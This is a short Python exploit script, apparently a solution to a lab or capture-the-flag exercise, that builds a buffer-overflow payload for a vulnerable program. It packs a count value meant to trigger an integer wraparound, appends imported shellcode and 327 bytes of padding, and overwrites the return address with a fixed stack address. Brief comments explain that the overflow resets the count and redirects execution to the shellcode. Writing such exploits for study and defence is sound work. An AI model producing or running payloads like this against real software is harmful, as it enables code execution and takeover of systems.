from shellcode import shellcode
import sys
from struct import pack

count = pack("<I", 0x40000052)
attack = count + shellcode + b'A'*327 + pack("<I", 0xfff6bfe0)

# the file is opened and if we overflow it, the count will reset to 0.
# this is where we can overwrite the return address
# the shellcode is inserted into the buffer and executed

sys.stdout.buffer.write(attack)
